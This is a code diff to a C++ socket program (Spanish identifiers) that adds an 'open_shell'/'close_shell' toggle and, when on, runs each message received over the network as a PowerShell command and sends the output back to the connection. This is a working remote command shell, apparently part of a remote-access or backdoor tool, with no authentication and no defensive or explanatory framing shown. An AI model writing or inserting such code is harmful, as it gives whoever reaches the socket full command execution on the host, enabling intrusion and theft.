@@ -8,9 +8,11 @@
 #include <asio.hpp>
 #include <thread>
 #include <iostream>
+#include <atomic>
 
 namespace Comunicacion
 {
+    std::atomic<bool> ShellCheck;
 
     inline bool PowerShell(const std::string &command, std::string &resultado)
     {
@@ -70,41 +72,51 @@ namespace Comunicacion
         {
             while (true)
             {
+                /////////////////////////////////////////////////////////
                 std::size_t length = sock.read_some(asio::buffer(data));
 
                 if (length == 0)
                 {
                     break;
                 }
-
                 std::string mensaje(data, length);
                 mensaje.pop_back();
                 if (mensaje.empty())
                 {
                     asio::write(sock, asio::buffer("Mensaje vacío, pibe... \n"));
                 }
+                /////////////////////////////////////////////////////////
+                if (!ShellCheck.load())
+                {
+                    if (mensaje == "open_shell")
+                    {
+                        ShellCheck.store(true, std::memory_order_seq_cst);
+                        continue;
+                    }
+
+                    asio::write(sock, asio::buffer(" - - Shell Desactivado - - "));
+                }
                 else
                 {
+                    // std::string msg = "Mensaje: " + mensaje + "\n Size: " + std::to_string(mensaje.size());
+                    // asio::write(sock, asio::buffer(msg));
 
-                    std::string msg = "Mensaje: " + mensaje + "\n Size: " + std::to_string(mensaje.size());
-                    asio::write(sock, asio::buffer(msg));
+                    if (mensaje == "close_shell")
+                    {
+                        ShellCheck.store(false, std::memory_order_seq_cst);
+                        continue;
+                    }
 
-                    // if (mensaje.find("exit") != std::string::npos)
-                    // {
-                    //     asio::write(sock, asio::buffer(" - Cerrando - \n"));
-                    //     break;
-                    // }
-
-                    // std::string resultado;
-                    // if (PowerShell(mensaje, resultado))
-                    // {
-                    //     std::string msg = "\n - - - - - Inicio - - - - -\n" + resultado + "\n - - - - - Final  - - - - -\n@bin> ";
-                    //     asio::write(sock, asio::buffer(msg));
-                    // }
-                    // else
-                    // {
-                    //     asio::write(sock, asio::buffer("Error ejecutando PowerShell\n@bin> "));
-                    // }
+                    std::string resultado;
+                    if (PowerShell(mensaje, resultado))
+                    {
+                        std::string msg = "\n - - - - - Inicio - - - - -\n" + resultado + "\n - - - - - Final  - - - - -\n@bin> ";
+                        asio::write(sock, asio::buffer(msg));
+                    }
+                    else
+                    {
+                        asio::write(sock, asio::buffer("Error ejecutando PowerShell\n@bin> "));
+                    }
                 }
             }
         }
